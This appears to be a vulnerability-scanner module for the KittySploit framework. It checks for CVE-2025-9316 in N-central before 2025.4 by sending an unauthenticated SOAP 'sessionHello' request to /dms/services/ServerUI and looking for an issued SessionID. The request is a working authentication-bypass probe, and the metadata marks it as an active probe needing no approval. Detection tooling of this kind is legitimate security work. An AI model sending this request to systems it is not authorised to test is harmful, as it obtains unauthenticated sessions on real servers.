#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""N-central < 2025."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'N-central - Authentication Bypass Detection',
        'description': 'N-central < 2025.4 can generate sessionIDs for unauthenticated users This issue affects N-central: before 2025.4.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'n-central', 'session-leak', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-9316',
            'https://github.com/horizon3ai/n-able_n-central_xxe_file_read/blob/main/ncentral_xxe_file_read.py',
        ],
        'cve': 'CVE-2025-9316',
    }

    def run(self):
        path = '/dms/services/ServerUI'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml', 'Soapaction': '""'}, data='<?xml version="1.0" encoding="UTF-8"?>\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n  <soapenv:Body>\n    <sessionHello>\n      <applianceID>3</applianceID>\n    </sessionHello>\n  </soapenv:Body>\n</soapenv:Envelope>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('SessionID', 'sessionHelloResponse',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='N-central - Authentication Bypass detected', path=path)
            return True
        return False

